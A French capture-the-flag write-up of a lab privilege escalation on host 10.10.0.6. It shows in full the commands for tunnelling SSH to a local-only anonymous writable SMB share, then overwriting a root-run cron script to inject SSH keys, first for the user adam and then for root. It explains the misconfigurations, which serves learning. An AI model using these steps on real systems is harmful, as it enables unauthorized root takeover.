Silence #2
> **Catégorie :** Privilege Escalation (SMB + tunnel SSH + cron writable → root)
> **Cible :** `10.10.0.6` (suite de Silence — `janja` → `adam` → `root`)
> **Flag :** `EPI{4D4m_0nDr4_51L3nC3_7H3_h4RD357_r0u73_3V3r_9c}`
---
Objectif
Suite directe de Silence #1. On repart de l'accès `janja` (sans aucun droit
sudo) et le but est d'atteindre root. La chaîne est plus longue et plus
réaliste que les précédentes :
accéder au home d'`adam` via un partage SMB anonyme exposé en local, en
passant par un tunnel SSH ;
abuser d'un script exécuté par cron en tant que root mais modifiable, pour
devenir `adam` puis `root` (via injection de clé SSH) ;
corriger en cours de route un piège de permissions sur `authorized_keys`.
Chaîne : janja → adam → root.
---
1. Énumération post-compromission (janja)
On passe en revue les vecteurs d'escalade classiques :
```bash
sudo -l                        # → aucun droit sudo pour janja
find / -perm -4000 2>/dev/null # → SUID standards, rien d'exploitable
cat /etc/crontab               # → tâches système classiques seulement
ls -la /home/                  # → adam, janja, magnus tous en 700 (verrouillés)
```
Rien d'évident. Il faut chercher plus loin.
---
2. Tentatives de pivot direct (échecs documentés)
```bash
su - adam        # avec le mdp du fichier Excel → échec
# exim4 vu dans les SUID → binaire introuvable en pratique → piste abandonnée
id ; groups      # janja n'appartient à aucun groupe privilégié
```
> Documenter les impasses évite d'y revenir. On sait maintenant que l'escalade ne
> passe **pas** par sudo, SUID, ni par un mot de passe réutilisé.
---
3. Découverte du vecteur — un partage SMB caché
On élargit la recherche aux services locaux et aux fichiers de config lisibles :
```bash
ls -la /var/www/html    # 777 mais PHP non interprété par Apache → pas de webshell
ss -tlnp                # (ou netstat) → port 445 (SMB) ouvert UNIQUEMENT en local
cat /etc/samba/smb.conf # lisible → révèle un partage critique
```
Le `smb.conf` expose un partage dangereux :
```ini
[Adam home dir]
   path = /home/adam
   force user = adam
   guest ok = yes
   writable = yes
```
Ce que ça signifie :
`guest ok = yes` → accès anonyme (sans mot de passe) ;
`force user = adam` → toute action est effectuée en tant qu'`adam` ;
`writable = yes` → accès en écriture au home d'`adam`.
> Autrement dit : n'importe qui atteignant ce partage peut écrire dans
> `/home/adam` en se faisant passer pour `adam`, sans authentification. Mais le
> port 445 n'est ouvert **qu'en local** (127.0.0.1) → il faut un tunnel pour
> l'atteindre depuis Kali.
---
4. Accès au partage via un tunnel SSH
Le port 445 est fermé depuis l'extérieur (confirmé par nmap). On crée un tunnel
SSH local pour rediriger un port de notre Kali vers le 445 de la cible :
```bash
ssh -f -N -L 4455:localhost:445 janja@10.10.0.6
```
`-L 4455:localhost:445` → tout ce qui arrive sur notre port 4455 est
transféré vers `localhost:445` depuis la cible (donc vers son SMB local).
`-f` → passe en arrière-plan ; `-N` → n'exécute aucune commande, juste le tunnel.
> **Le principe du tunnel :** un service lié à `127.0.0.1` n'est pas joignable de
> l'extérieur. Mais une fois connecté en SSH, on peut faire « ressortir » ce port
> local à travers le tunnel. `localhost:4455` chez nous = `localhost:445` chez la
> cible.
Connexion au partage en anonyme :
```bash
smbclient -L localhost -p 4455 -N
smbclient //localhost/"Adam home dir" -p 4455 -N
```
`-N` → pas de mot de passe (accès anonyme).
→ le partage est visible et accessible.
---
5. Découverte du vecteur d'exécution — cron + script
En listant le partage, on trouve `checklist.sh` dans le home d'`adam`. Son
analyse montre qu'il réinitialise ses propres permissions à 744 à chaque
exécution → signe qu'il tourne régulièrement (cron).
Confirmé plus tard depuis la session `adam` :
```bash
cat /etc/cron.d/adam
# * * * * * root /home/adam/checklist.sh
```
Le vecteur : ce script est exécuté chaque minute en tant que root, alors
qu'il se trouve dans un répertoire (et bientôt un fichier) qu'on peut modifier via
SMB. Quiconque écrit dans ce fichier fait exécuter son code par root.
---
6. Premier essai d'injection de clé SSH (échec)
On remplace `checklist.sh` par un script qui crée `authorized_keys` avec notre clé
publique Kali dans le `.ssh` d'`adam` :
```bash
# script uploadé via SMB (exécuté par cron)
mkdir -p /home/adam/.ssh
echo "ssh-ed25519 AAAA... kali" > /home/adam/.ssh/authorized_keys
```
Puis :
```bash
ssh -i ~/.ssh/id_ed25519 adam@10.10.0.6   # → échec, mot de passe redemandé
ssh -v -i ~/.ssh/id_ed25519 adam@10.10.0.6 # debug : clé proposée mais rejetée
```
Le mode verbeux (`-v`) montre que le client propose bien la clé, mais que le
serveur la rejette. Le problème n'est donc pas la clé, mais quelque chose côté
serveur.
---
7. Diagnostic du problème de permissions
Le `.ssh` devient inaccessible en lecture via SMB (`NT_STATUS_ACCESS_DENIED`). On
injecte un script de debug qui écrit dans `/tmp/debug.log` (lisible par janja) :
```bash
ls -la /home/adam/.ssh/authorized_keys > /tmp/debug.log
```
→ révélation :
```
-rw------- 1 root root ... authorized_keys
```
Le piège : le fichier appartient à root, pas à `adam` (parce que le cron
l'a créé en tant que root). Or OpenSSH refuse d'utiliser un `authorized_keys`
qui n'appartient pas à l'utilisateur cible — une protection anti-abus. D'où
l'échec silencieux.
> **Leçon SSH :** `authorized_keys` doit appartenir à l'utilisateur et avoir des
> permissions strictes (`600`), et `.ssh` doit être en `700`. Sinon SSH ignore la
> clé sans message clair côté client.
---
8. Correction et accès à adam
On ajoute un `chown` après l'écriture de la clé, pour redonner le fichier à
`adam` (le cron tournant en root, le chown fonctionne) :
```bash
mkdir -p /home/adam/.ssh
echo "ssh-ed25519 AAAA... kali" > /home/adam/.ssh/authorized_keys
chown -R adam:adam /home/adam/.ssh
chmod 700 /home/adam/.ssh
chmod 600 /home/adam/.ssh/authorized_keys
```
Upload via SMB, attente du cron (~1 min), puis :
```bash
ssh -i ~/.ssh/id_ed25519 adam@10.10.0.6   # → connexion réussie
```
→ accès en tant que adam.
---
9. Escalade finale vers root
En tant qu'`adam`, on constate que `checklist.sh` lui appartient et est
modifiable :
```bash
ls -la ~
# -rwxr--r-- adam adam ... checklist.sh
cat /etc/cron.d/adam
# * * * * * root /home/adam/checklist.sh
```
Le script est à nous et exécuté par root chaque minute → escalade directe. On
réécrit le script pour injecter notre clé dans le `authorized_keys` de root,
en corrigeant tout de suite le propriétaire :
```bash
cat > /home/adam/checklist.sh << 'EOF'
#!/bin/bash
mkdir -p /root/.ssh
echo "ssh-ed25519 AAAA... kali" >> /root/.ssh/authorized_keys
chown -R root:root /root/.ssh
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
EOF
```
Attente du cron (~1 min), puis :
```bash
ssh -i ~/.ssh/id_ed25519 root@10.10.0.6   # → accès root
```
---
10. Capture du flag
```bash
cat /root/root.txt
```
→ Flag :
```
EPI{4D4m_0nDr4_51L3nC3_7H3_h4RD357_r0u73_3V3r_9c}
```
---
Concepts clés à retenir
Concept	Explication
Services liés à localhost	Un service sur `127.0.0.1:445` n'est pas joignable de l'extérieur → tunnel nécessaire.
Tunnel SSH (`-L`)	Fait ressortir un port distant local via la connexion SSH.
Partage SMB `guest ok` + `force user`	Écriture anonyme dans le home d'un utilisateur = compromission.
Cron writable	Un script exécuté par root mais modifiable = escalade root garantie.
Piège `authorized_keys`	SSH refuse la clé si le fichier n'appartient pas à l'utilisateur / permissions trop larges.
Debug SSH (`-v`)	Indispensable pour comprendre pourquoi une clé est rejetée.
Point clé de la chaîne : un script shell détenu par un utilisateur non
privilégié mais exécuté périodiquement par root via cron est une
vulnérabilité de privesc classique — quiconque peut écrire dans ce fichier hérite
de l'exécution root.
---
Résumé de la chaîne d'attaque
```
ssh janja (aucun sudo)
   → énumération : SMB 445 en local + smb.conf ("Adam home dir", guest, force user=adam, writable)
   → tunnel SSH -L 4455:localhost:445
   → smbclient anonyme → écriture dans /home/adam
   → checklist.sh exécuté par cron en root (/etc/cron.d/adam)
   → injection clé SSH adam (échec : fichier owned by root)
   → debug -v + /tmp/debug.log → diagnostic permissions
   → script + chown adam → ssh adam OK
   → checklist.sh appartient à adam → injection clé dans /root/.ssh + chown root
   → attente cron → ssh root → FLAG
```